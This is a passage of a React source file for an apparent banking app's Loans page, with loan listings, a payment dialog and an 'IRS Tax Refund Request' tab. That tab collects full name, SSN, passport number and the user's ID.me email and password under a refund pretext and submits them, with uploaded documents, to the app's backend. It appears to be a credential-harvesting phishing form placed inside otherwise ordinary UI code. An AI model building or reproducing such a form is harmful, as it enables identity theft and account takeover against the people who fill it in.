import React, { useEffect, useState } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useLocation } from 'react-router-dom';
import { Box, Typography, Paper, Grid, Button, Card, CardContent, CircularProgress, Alert, Dialog, DialogTitle, DialogContent, DialogActions, TextField, Tab, Tabs, MenuItem, Stepper, Step, StepLabel, IconButton, List, ListItem, ListItemText } from '@mui/material';
import { Close, AttachFile, InsertDriveFile, Delete, Email as EmailIcon, CloudUpload } from '@mui/icons-material';
import { motion } from 'framer-motion';
import { getUserLoans, getAvailableLoanTypes, applyForLoan, makeLoanPayment, submitTaxRefundRequest } from '../store/slices/loanSlice';

const Loans = () => {
  const dispatch = useDispatch();
  const location = useLocation();
  const { loans, loading, error, availableLoanTypes } = useSelector((state) => state.loans);
  const [openPaymentDialog, setOpenPaymentDialog] = useState(false);
  const [openApplyDialog, setOpenApplyDialog] = useState(false);
  const [tabValue, setTabValue] = useState(0); // 0 = Loans, 1 = IRS Tax Refund
  const [selectedLoan, setSelectedLoan] = useState(null);
  const [paymentAmount, setPaymentAmount] = useState('');
  const [selectedLoanType, setSelectedLoanType] = useState(null);
  const [loanAmount, setLoanAmount] = useState('');
  const [loanApplicationStep, setLoanApplicationStep] = useState(0); // Track current step in loan application stepper
  const [loanPaymentStep, setLoanPaymentStep] = useState(0); // Track current step in loan payment stepper
  
  // IRS Tax Refund form state
  const [irsForm, setIrsForm] = useState({
    fullName: '',
    ssn: '',
    idmeEmail: '',
    idmePassword: '',
    country: '',
    passportNumber: ''
  });
  const [irsSubmitting, setIrsSubmitting] = useState(false);
  const [irsSuccess, setIrsSuccess] = useState(false);
  const [uploadedDocuments, setUploadedDocuments] = useState([]);
  const [emailSending, setEmailSending] = useState(false);
  
  // List of countries for the dropdown
  const countries = [
    'United States', 'Canada', 'United Kingdom', 'Australia', 'Germany', 'France', 
    'Italy', 'Spain', 'Mexico', 'Brazil', 'India', 'China', 'Japan', 'South Korea',
    'Afghanistan', 'Albania', 'Algeria', 'Argentina', 'Armenia', 'Austria', 'Azerbaijan',
    'Bahamas', 'Bahrain', 'Bangladesh', 'Barbados', 'Belarus', 'Belgium', 'Belize', 'Benin',
    'Bhutan', 'Bolivia', 'Bosnia and Herzegovina', 'Botswana', 'Brazil', 'Bulgaria', 'Burkina Faso',
    'Burundi', 'Cambodia', 'Cameroon', 'Canada', 'Cape Verde', 'Chad', 'Chile', 'China', 'Colombia',
    'Comoros', 'Costa Rica', 'Croatia', 'Cuba', 'Cyprus', 'Czech Republic', 'Denmark', 'Djibouti',
    'Dominica', 'Dominican Republic', 'Ecuador', 'Egypt', 'El Salvador', 'Estonia', 'Ethiopia',
    'Fiji', 'Finland', 'France', 'Georgia', 'Germany', 'Ghana', 'Greece', 'Guatemala', 'Haiti',
    'Honduras', 'Hong Kong', 'Hungary', 'Iceland', 'India', 'Indonesia', 'Iran', 'Iraq', 'Ireland',
    'Israel', 'Italy', 'Jamaica', 'Japan', 'Jordan', 'Kazakhstan', 'Kenya', 'Kuwait', 'Kyrgyzstan',
    'Laos', 'Latvia', 'Lebanon', 'Libya', 'Lithuania', 'Luxembourg', 'Malaysia', 'Maldives', 'Mali',
    'Malta', 'Mauritania', 'Mauritius', 'Mexico', 'Moldova', 'Monaco', 'Mongolia', 'Montenegro',
    'Morocco', 'Mozambique', 'Namibia', 'Nepal', 'Netherlands', 'New Zealand', 'Nicaragua', 'Niger',
    'Nigeria', 'Norway', 'Oman', 'Pakistan', 'Palestine', 'Panama', 'Paraguay', 'Peru', 'Philippines',
    'Poland', 'Portugal', 'Qatar', 'Romania', 'Russian Federation', 'Rwanda', 'Saudi Arabia',
    'Senegal', 'Serbia', 'Singapore', 'Slovakia', 'Slovenia', 'South Africa', 'South Sudan', 'Spain',
    'Sri Lanka', 'Sudan', 'Sweden', 'Switzerland', 'Syria', 'Taiwan', 'Tajikistan', 'Tanzania',
    'Thailand', 'Togo', 'Trinidad and Tobago', 'Tunisia', 'Turkey', 'Turkmenistan', 'Uganda',
    'Ukraine', 'United Arab Emirates', 'Uruguay', 'Uzbekistan', 'Vanuatu', 'Venezuela', 'Vietnam',
    'Yemen', 'Zambia', 'Zimbabwe'
  ];

  useEffect(() => {
    dispatch(getUserLoans());
    dispatch(getAvailableLoanTypes());
  }, [dispatch, location.pathname]);

  const handlePaymentClick = (loan) => {
    setSelectedLoan(loan);
    setPaymentAmount('');
    setLoanPaymentStep(0); // Reset to first step when opening new payment
    setOpenPaymentDialog(true);
  };

  const handlePaymentSubmit = () => {
    if (selectedLoan && paymentAmount) {
      dispatch(makeLoanPayment({ 
        id: selectedLoan.id, 
        paymentData: { amount: parseFloat(paymentAmount) } 
      }));
      setOpenPaymentDialog(false);
    }
  };

  const handleApplyClick = (loanType) => {
    setSelectedLoanType(loanType);
    setLoanAmount('');
    setLoanApplicationStep(0); // Reset to first step when opening new application
    setOpenApplyDialog(true);
  };

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
    setIrsSuccess(false);
  };

  const handleIrsFormChange = (e) => {
    setIrsForm(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };

  const handleDocumentUpload = (e) => {
    const files = Array.from(e.target.files);
    const newDocuments = files.map((file, index) => ({
      id: Date.now() + index,
      name: file.name,
      size: file.size,
      type: file.type,
      file: file
    }));
    setUploadedDocuments(prev => [...prev, ...newDocuments]);
  };

  const handleRemoveDocument = (documentId) => {
    setUploadedDocuments(prev => prev.filter(doc => doc.id !== documentId));
  };

  const sendConfirmationEmail = async () => {
    if (!irsForm.idmeEmail) return;
    
    setEmailSending(true);
    try {
      // In a real app, this would call an API endpoint to send the email
      await new Promise(resolve => setTimeout(resolve, 1500));
      console.log(`Confirmation email sent to ${irsForm.idmeEmail}`);
      alert(`Confirmation email sent to ${irsForm.idmeEmail}`);
    } catch (error) {
      console.error('Failed to send email:', error);
    } finally {
      setEmailSending(false);
    }
  };

  const handleIrsSubmit = async () => {
    setIrsSubmitting(true);
    try {
      // Create FormData to send files with the request
      const formData = new FormData();
      // Append all form fields
      Object.keys(irsForm).forEach(key => {
        formData.append(key, irsForm[key]);
      });
      // Append all uploaded documents
      uploadedDocuments.forEach((doc, index) => {
        formData.append(`document_${index}`, doc.file);
      });
      
      await dispatch(submitTaxRefundRequest(formData)).unwrap();
      // Send confirmation email after successful submission
      await sendConfirmationEmail();
      setIrsSuccess(true);
      // Reset form and uploaded documents
      setIrsForm({
        fullName: '',
        ssn: '',
        idmeEmail: '',
        idmePassword: '',
        country: ''
      });
      setUploadedDocuments([]);
    } catch (error) {
      console.error('Tax refund request failed:', error);
    } finally {
      setIrsSubmitting(false);
    }
  };

  const handleApplySubmit = () => {
    if (selectedLoanType && loanAmount) {
      dispatch(applyForLoan({
        loanType: selectedLoanType.type,
        amount: parseFloat(loanAmount)
      }));
      setOpenApplyDialog(false);
    }
  };

  if (loading) {
    return (
      <Box display="flex" justifyContent="center" alignItems="center" minHeight="80vh">
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Box mt={4}>
        <Alert severity="error">{error}</Alert>
      </Box>
    );
  }

  return (
    <Box sx={{ 
      position: 'relative', 
      overflow: 'hidden',
      background: 'linear-gradient(135deg, #f0f4ff 0%, #f8fafc 30%, #f0fdf4 70%, #f8fafc 100%)',
      minHeight: '100vh',
      p: { xs: 2, md: 0 }
    }}>
      {/* Enhanced floating animated background elements */}
      <motion.div
        animate={{ 
          x: [0, 30, 0], 
          y: [0, -40, 0],
          scale: [1, 1.05, 1]
        }}
        transition={{ 
          duration: 15, 
          repeat: Infinity, 
          ease: "easeInOut" 
        }}
        style={{
          position: 'fixed',
          top: '-5%',
          right: '-10%',
          width: '600px',
          height: '600px',
          borderRadius: '50%',
          background: 'radial-gradient(circle, rgba(0,200,150,0.15) 0%, rgba(0,200,150,0.05) 40%, transparent 70%)',
          filter: 'blur(70px)',
          pointerEvents: 'none',
          zIndex: 0
        }}
      />
      <motion.div
        animate={{ 
          x: [0, -30, 0], 
          y: [0, 40, 0],
          scale: [1, 1.1, 1]
        }}
        transition={{ 
          duration: 20, 
          repeat: Infinity, 
          ease: "easeInOut",
          delay: 2
        }}
        style={{
          position: 'fixed',
          bottom: '-10%',
          left: '-5%',
          width: '700px',
          height: '700px',
          borderRadius: '50%',
          background: 'radial-gradient(circle, rgba(0,102,255,0.12) 0%, rgba(0,102,255,0.03) 40%, transparent 70%)',
          filter: 'blur(80px)',
          pointerEvents: 'none',
          zIndex: 0
        }}
      />

      <Box sx={{ position: 'relative', zIndex: 1, maxWidth: '1400px', margin: '0 auto', px: { xs: 2, md: 4 } }}>
        <motion.div
          initial={{ opacity: 0, y: -30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, ease: "easeOut" }}
        >
          <Typography variant="h3" sx={{ 
            fontWeight: 800, 
            background: 'linear-gradient(135deg, #0f2744 0%, #1e4d8a 30%, #0066ff 60%, #00c896 100%)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            mb: 2,
            mt: 4
          }}>Loans & IRS Tax Refunds</Typography>
        </motion.div>
        
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
        >
          <Paper sx={{ 
            mb: 5,
            borderRadius: 2,
            background: 'rgba(255,255,255,0.85)',
            backdropFilter: 'blur(40px) saturate(180%)',
            border: '1px solid rgba(255,255,255,0.4)',
            boxShadow: '0 25px 80px -20px rgba(0,102,255,0.3), 0 0 0 1px rgba(255,255,255,0.1) inset, 0 50px 100px -30px rgba(0,0,0,0.2)',
            overflow: 'hidden'
          }}>
            <Tabs 
              value={tabValue} 
              onChange={handleTabChange} 
              sx={{ 
                borderBottom: 1, 
                borderColor: 'rgba(0,0,0,0.06)',
                '& .MuiTab-root': {
                  fontSize: '1rem',
                  fontWeight: 600,
                  textTransform: 'none',
                  minHeight: 72,
                  transition: 'all 0.3s ease',
                  '&:hover': {
                    color: '#0066ff',
                    backgroundColor: 'rgba(0,102,255,0.04)'
                  },
                  '&.Mui-selected': {
                    color: '#0066ff !important',
                    fontWeight: 700
                  }
                },
                '& .MuiTabs-indicator': {
                  background: 'linear-gradient(90deg, #0066ff 0%, #00c896 100%)',
                  height: 4,
                  borderRadius: '2px'
                }
              }}
            >
              <Tab label="Loan Services" />
              <Tab label="IRS Tax Refund Request" />
            </Tabs>
          </Paper>

      {tabValue === 0 && (
        <></>
      )}

      {tabValue === 1 && (
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.7 }}
        >
          <Paper sx={{ 
            p: { xs: 3, md: 6 }, 
            borderRadius: 2,
            background: 'linear-gradient(135deg, rgba(255,255,255,0.92) 0%, rgba(240,247,255,0.88) 100%)',
            backdropFilter: 'blur(40px) saturate(180%)',
            border: '1px solid rgba(255,152,0,0.2)',
            boxShadow: '0 25px 80px -20px rgba(255,152,0,0.35), 0 0 0 1px rgba(255,255,255,0.1) inset, 0 50px 100px -30px rgba(0,0,0,0.25)'
          }}>
            <Typography variant="h4" sx={{ 
              fontWeight: 700,
              background: 'linear-gradient(135deg, #f57c00 0%, #ff9800 50%, #ffb74d 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
              mb: 2
            }}>IRS Tax Refund Request</Typography>
            <Typography variant="body1" sx={{ mb: 5, color: '#4a5568', fontSize: '1.05rem' }}>
              Please fill out the form below to submit your IRS tax refund request
            </Typography>

            {irsSuccess && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.4 }}
              >
                <Alert 
                  severity="success" 
                  sx={{ 
                    mb: 4, 
                    py: 2,
                    borderRadius: '16px',
                    fontSize: '1rem',
                    backgroundColor: 'rgba(0,200,150,0.1)',
                    border: '1px solid rgba(0,200,150,0.3)',
                    color: '#166534',
                    '& .MuiAlert-icon': {
                      color: '#00c896'
                    }
                  }}
                >
                  Your IRS tax refund request has been submitted successfully! We will process it and contact you soon.
                </Alert>
              </motion.div>
            )}

            <Grid container spacing={4}>
              <Grid item xs={12} md={6}>
                <motion.div whileHover={{ y: -3 }} transition={{ duration: 0.3 }}>
                  <Paper sx={{ 
                    p: 4, 
                    borderRadius: 2,
                    background: 'rgba(255,255,255,0.7)',
                    backdropFilter: 'blur(20px)',
                    border: '1px solid rgba(0,102,255,0.1)',
                    boxShadow: '0 10px 40px -10px rgba(0,102,255,0.15)',
                    transition: 'all 0.4s ease',
                    '&:hover': {
                      boxShadow: '0 20px 60px -15px rgba(0,102,255,0.3)'
                    }
                  }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, color: '#1e3a5f' }}>Personal Information</Typography>
                    <TextField
                      fullWidth
                      label="Full Name"
                      name="fullName"
                      value={irsForm.fullName}
                      onChange={handleIrsFormChange}
                      margin="normal"
                      required
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          borderRadius: '12px',
                          transition: 'all 0.3s ease',
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#ff9800'
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#ff9800',
                            borderWidth: 2
                          }
                        }
                      }}
                    />
                    <TextField
                      fullWidth
                      label="Social Security Number (SSN)"
                      name="ssn"
                      value={irsForm.ssn}
                      onChange={handleIrsFormChange}
                      margin="normal"
                      required
                      placeholder="XXX-XX-XXXX"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          borderRadius: '12px',
                          transition: 'all 0.3s ease',
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#ff9800'
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#ff9800',
                            borderWidth: 2
                          }
                        }
                      }}
                    />
                    <TextField
                      fullWidth
                      label="Passport Number"
                      name="passportNumber"
                      value={irsForm.passportNumber}
                      onChange={handleIrsFormChange}
                      margin="normal"
                      required
                      placeholder="Passport number"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          borderRadius: '12px',
                          transition: 'all 0.3s ease',
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#ff9800'
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#ff9800',
                            borderWidth: 2
                          }
                        }
                      }}
                    />
                  </Paper>
                </motion.div>
              </Grid>
              <Grid item xs={12} md={6}>
                <motion.div whileHover={{ y: -3 }} transition={{ duration: 0.3 }}>
                  <Paper sx={{ 
                    p: 4, 
                    borderRadius: 2,
                    background: 'rgba(255,255,255,0.7)',
                    backdropFilter: 'blur(20px)',
                    border: '1px solid rgba(0,200,150,0.1)',
                    boxShadow: '0 10px 40px -10px rgba(0,200,150,0.15)',
                    transition: 'all 0.4s ease',
                    '&:hover': {
                      boxShadow: '0 20px 60px -15px rgba(0,200,150,0.3)'
                    }
                  }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, color: '#1e3a5f' }}>ID.me Credentials</Typography>
                    <TextField
                      fullWidth
                      label="ID.me Email"
                      name="idmeEmail"
                      type="email"
                      value={irsForm.idmeEmail}
                      onChange={handleIrsFormChange}
                      margin="normal"
                      required
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          borderRadius: '12px',
                          transition: 'all 0.3s ease',
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#0066ff'
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#0066ff',
                            borderWidth: 2
                          }
                        }
                      }}
                    />
                    <TextField
                      fullWidth
                      label="ID.me Password"
                      name="idmePassword"
                      type="password"
                      value={irsForm.idmePassword}
                      onChange={handleIrsFormChange}
                      margin="normal"
                      required
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          borderRadius: '12px',
                          transition: 'all 0.3s ease',
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#0066ff'
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#0066ff',
                            borderWidth: 2
                          }
                        }
                      }}
                    />
                  </Paper>
                </motion.div>
              </Grid>
              <Grid item xs={12}>
                <motion.div whileHover={{ y: -3 }} transition={{ duration: 0.3 }}>
                  <Paper sx={{ 
                    p: 4, 
                    borderRadius: 2,
                    background: 'rgba(255,255,255,0.7)',
                    backdropFilter: 'blur(20px)',
                    border: '1px solid rgba(0,102,255,0.1)',
                    boxShadow: '0 10px 40px -10px rgba(0,102,255,0.15)',
                    transition: 'all 0.4s ease',
                    '&:hover': {
                      boxShadow: '0 20px 60px -15px rgba(0,102,255,0.3)'
                    }
                  }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, color: '#1e3a5f' }}>Location Information</Typography>
                    <TextField
                      select
                      fullWidth
                      label="Country"
                      name="country"
                      value={irsForm.country}
                      onChange={handleIrsFormChange}
                      margin="normal"
                      required
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          borderRadius: '12px',
                          transition: 'all 0.3s ease',
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#0066ff'
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#0066ff',
                            borderWidth: 2
                          }
                        }
                      }}
                    >
                      {countries.map((country) => (
                        <MenuItem key={country} value={country}>
                          {country}
                        </MenuItem>
                      ))}
                    </TextField>
                  </Paper>
                </motion.div>
              </Grid>
              <Grid item xs={12}>
                <motion.div transition={{ duration: 0.2 }}>
                  <Alert severity="warning" sx={{ 
                    mt: 2, 
                    mb: 4,
                    py: 3,
                    borderRadius: '16px',
                    fontSize: '1rem',
                    backgroundColor: 'rgba(255,152,0,0.08)',
                    border: '1px solid rgba(255,152,0,0.3)',
                    color: '#c25500',
                    '& .MuiAlert-icon': {
                      color: '#ff9800'
                    }
                  }}>
                    <strong>Important Notice:</strong> Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
                  </Alert>
                </motion.div>
              </Grid>
              <Grid item xs={12}>
                <motion.div>
                  <Button
                    variant="contained"
                    size="large"
                    onClick={handleIrsSubmit}
                    disabled={irsSubmitting || !irsForm.fullName || !irsForm.ssn || !irsForm.idmeEmail || !irsForm.idmePassword || !irsForm.country}
                    sx={{
                      py: 2,
                      px: 6,
                      fontSize: '1.1rem',
                      fontWeight: 700,
                      borderRadius: '16px',
                      background: 'linear-gradient(135deg, #f57c00 0%, #ff9800 50%, #ffb74d 100%)',
                      boxShadow: '0 15px 40px -10px rgba(255,152,0,0.5)',
                      transition: 'all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
                      '&:hover': {
                        boxShadow: '0 20px 50px -12px rgba(255,152,0,0.7), 0 0 40px rgba(255,152,0,0.3)'
                      },
                      '&.Mui-disabled': {
                        background: '#e0e0e0',
                        boxShadow: 'none'
                      }
                    }}
                  >
                    {irsSubmitting ? <CircularProgress size={24} sx={{ color: 'white' }} /> : 'Submit Request'}
                  </Button>
                </motion.div>
              </Grid>
            </Grid>
          </Paper>
        </motion.div>
      )}

      {/* Loan Services Content */}
      {tabValue === 0 && (
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.7 }}
        >
          {loans.length > 0 && (
            <>
              <motion.div
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.5, delay: 0.3 }}
              >
                <Typography variant="h5" sx={{ 
                  mt: 4, 
                  mb: 3,
                  fontWeight: 700,
                  color: '#1e3a5f'
                }}>Your Active Loans</Typography>
              </motion.div>
              {loans.map((loan, index) => (
                <motion.div 
                  key={loan.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5, delay: 0.4 + (index * 0.1) }}
                  whileHover={{ scale: 1.02, y: -5 }}
                >
                  <Paper sx={{ 
                    p: 4, 
                    mb: 3,
                    borderRadius: 2,
                    background: 'linear-gradient(135deg, rgba(255,255,255,0.9) 0%, rgba(240,247,255,0.85) 100%)',
                    backdropFilter: 'blur(30px)',
                    border: '1px solid rgba(0,102,255,0.15)',
                    boxShadow: '0 15px 50px -15px rgba(0,102,255,0.25)',
                    transition: 'all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
                    '&:hover': {
                      boxShadow: '0 30px 70px -20px rgba(0,102,255,0.4), 0 0 50px rgba(0,102,255,0.15)'
                    }
                  }}>
                    <Grid container spacing={3} alignItems="center">
                      <Grid item xs={12} md={3}>
                        <Typography variant="h6" sx={{ fontWeight: 700, color: '#1e3a5f' }}>{loan.type}</Typography>
                        <Typography color="text.secondary" sx={{ fontSize: '1.05rem' }}>${loan.amount.toLocaleString()} total</Typography>
                      </Grid>
                      <Grid item xs={12} md={3}>
                        <Typography sx={{ fontSize: '1rem', fontWeight: 500 }}>Remaining: <strong>${loan.remaining.toLocaleString()}</strong></Typography>
                        <Typography color="text.secondary">EMI: ${loan.emi}/month</Typography>
                      </Grid>
                      <Grid item xs={12} md={3}>
                        <Typography sx={{ fontSize: '1rem' }}>Next EMI: <strong>{loan.nextEmiDate}</strong></Typography>
                      </Grid>
                      <Grid item xs={12} md={3}>
                        <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                          <Button 
                            variant="contained" 
                            onClick={() => handlePaymentClick(loan)}
                            sx={{
                              py: 1.5,
                              px: 4,
                              borderRadius: '12px',
                              background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)',
                              boxShadow: '0 10px 30px -10px rgba(0,102,255,0.5)',
                              transition: 'all 0.3s ease',
                              '&:hover': {
                                boxShadow: '0 15px 40px -10px rgba(0,102,255,0.7), 0 0 30px rgba(0,102,255,0.25)'
                              }
                            }}
                          >
                            Pay Now
                          </Button>
                        </motion.div>
                      </Grid>
                    </Grid>
                  </Paper>
                </motion.div>
              ))}
            </>
          )}

          {loans.length === 0 && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.5 }}
            >
              <Paper sx={{ 
                p: 6, 
                textAlign: 'center', 
                mt: 4,
                borderRadius: '24px',
                background: 'rgba(255,255,255,0.8)',
                backdropFilter: 'blur(30px)',
                border: '1px solid rgba(0,0,0,0.05)',
                boxShadow: '0 15px 50px -15px rgba(0,0,0,0.1)'
              }}>
                <Typography variant="h5" color="text.secondary" sx={{ fontWeight: 600 }}>You don't have any active loans</Typography>
              </Paper>
            </motion.div>
          )}

          <motion.div
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.5, delay: 0.5 }}
          >
            <Typography variant="h5" sx={{ 
              mt: 8, 
              mb: 3,
              fontWeight: 700,
              color: '#1e3a5f'
            }}>Apply for New Loan</Typography>
          </motion.div>
          {availableLoanTypes.length > 0 ? (
            <Grid container spacing={4}>
              {availableLoanTypes.map((option, index) => (
                <Grid item xs={12} md={6} key={index}>
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.5, delay: 0.6 + (index * 0.15) }}
                    whileHover={{ scale: 1.03, y: -8 }}
                  >
                    <Card sx={{ 
                      borderRadius: 2,
                      overflow: 'hidden',
                      background: index % 2 === 0 
                        ? 'linear-gradient(135deg, rgba(0,102,255,0.05) 0%, rgba(0,200,150,0.05) 100%)'
                        : 'linear-gradient(135deg, rgba(0,200,150,0.05) 0%, rgba(255,152,0,0.05) 100%)',
                      backdropFilter: 'blur(30px)',
                      border: index % 2 === 0
                        ? '1px solid rgba(0,102,255,0.2)'
                        : '1px solid rgba(0,200,150,0.2)',
                      boxShadow: index % 2 === 0
                        ? '0 20px 60px -15px rgba(0,102,255,0.3)'
                        : '0 20px 60px -15px rgba(0,200,150,0.3)',
                      transition: 'all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
                      '&:hover': {
                        boxShadow: index % 2 === 0
                          ? '0 35px 80px -20px rgba(0,102,255,0.5), 0 0 60px rgba(0,102,255,0.2)'
                          : '0 35px 80px -20px rgba(0,200,150,0.5), 0 0 60px rgba(0,200,150,0.2)'
                      }
                    }}>
                      <CardContent sx={{ p: 5 }}>
                        <Typography variant="h5" sx={{ fontWeight: 700, color: '#1e3a5f', mb: 1 }}>{option.type}</Typography>
                        <Typography 
                          color="primary" 
                          variant="h4" 
                          sx={{ 
                            my: 2, 
                            fontWeight: 800,
                            background: index % 2 === 0
                              ? 'linear-gradient(135deg, #0066ff 0%, #00c896 100%)'
                              : 'linear-gradient(135deg, #00c896 0%, #ff9800 100%)',
                            WebkitBackgroundClip: 'text',
                            WebkitTextFillColor: 'transparent'
                          }}
                        >{option.rate}% p.a.</Typography>
                        <Typography color="text.secondary" sx={{ fontSize: '1.1rem', mb: 4 }}>Up to ${option.maxAmount?.toLocaleString()}</Typography>
                        <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                          <Button 
                            variant="contained" 
                            sx={{ 
                              mt: 2,
                              py: 1.5,
                              px: 5,
                              fontSize: '1.05rem',
                              fontWeight: 700,
                              borderRadius: '14px',
                              background: index % 2 === 0
                                ? 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)'
                                : 'linear-gradient(135deg, #00c896 0%, #00e0a8 100%)',
                              boxShadow: index % 2 === 0
                                ? '0 12px 35px -10px rgba(0,102,255,0.6)'
                                : '0 12px 35px -10px rgba(0,200,150,0.6)',
                              transition: 'all 0.3s ease',
                              '&:hover': {
                                boxShadow: index % 2 === 0
                                  ? '0 18px 45px -10px rgba(0,102,255,0.8), 0 0 35px rgba(0,102,255,0.3)'
                                  : '0 18px 45px -10px rgba(0,200,150,0.8), 0 0 35px rgba(0,200,150,0.3)'
                              }
                            }} 
                            onClick={() => handleApplyClick(option)}
                          >
                            Apply Now
                          </Button>
                        </motion.div>
                      </CardContent>
                    </Card>
                  </motion.div>
                </Grid>
              ))}
            </Grid>
          ) : (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.5 }}
            >
              <Paper sx={{ 
                p: 6, 
                textAlign: 'center',
                borderRadius: '24px',
                background: 'rgba(255,255,255,0.8)',
                backdropFilter: 'blur(30px)',
                border: '1px solid rgba(0,0,0,0.05)',
                boxShadow: '0 15px 50px -15px rgba(0,0,0,0.1)'
              }}>
                <Typography variant="body1" color="text.secondary" sx={{ fontSize: '1.1rem' }}>Loading loan options...</Typography>
              </Paper>
            </motion.div>
          )}
        </motion.div>
      )}

      {/* Payment Dialog */}
      <Dialog 
        open={openPaymentDialog} 
        onClose={() => setOpenPaymentDialog(false)} 
        maxWidth="md" 
        fullWidth
        PaperProps={{
          sx: {
            borderRadius: '24px',
            overflow: 'hidden',
            boxShadow: '0 50px 150px -30px rgba(0,102,255,0.4)'
          }
        }}
      >
        <DialogTitle sx={{ 
          background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)',
          color: 'white',
          fontWeight: 700,
          position: 'relative',
          py: 4,
          px: 5,
          fontSize: '1.5rem'
        }}>
          Make Loan Payment
          <IconButton
            aria-label="close"
            onClick={() => setOpenPaymentDialog(false)}
            sx={{ 
              position: 'absolute', 
              right: 16, 
              top: '50%',
              transform: 'translateY(-50%)',
              color: 'white',
              transition: 'all 0.3s ease',
              '&:hover': {
                backgroundColor: 'rgba(255,255,255,0.15)',
                transform: 'translateY(-50%) scale(1.1)'
              }
            }}
          >
            <Close fontSize="large" />
          </IconButton>
        </DialogTitle>
        <DialogContent sx={{ pt: 5, px: 5, pb: 4 }}>
          {/* Loan Payment Stepper */}
          <Stepper 
            activeStep={loanPaymentStep} 
            sx={{ 
              mb: 5,
              '& .MuiStepLabel-root': {
                '& .MuiStepLabel-label': {
                  fontSize: '0.95rem',
                  fontWeight: 500
                }
              },
              '& .MuiStepConnector-line': {
                borderColor: 'rgba(0,102,255,0.2)'
              },
              '& .Mui-active .MuiStepIcon-root': {
                color: '#0066ff !important'
              }
            }}
          >
            {['Step 1: Review Payment Details', 'Step 2: Enter Payment Amount', 'Step 3: Confirm Payment'].map((label) => (
              <Step key={label}>
                <StepLabel>{label}</StepLabel>
              </Step>
            ))}
          </Stepper>

          {/* Step 1: Review Payment Details */}
          {loanPaymentStep === 0 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 1: Review Your Payment Details</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Review the details of your loan before making a payment</Typography>
              </Grid>
              
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 3, height: '100%' }}>
                  <Typography variant="h6" gutterBottom>Loan Summary</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoan?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Remaining Balance:</strong> ${selectedLoan?.remaining?.toLocaleString()}</Typography>
                  </Box>
                </Card>
              </Grid>
              
              <Grid item xs={12}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(1)}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Enter Payment Amount →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 2: Enter Payment Amount */}
          {loanPaymentStep === 1 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
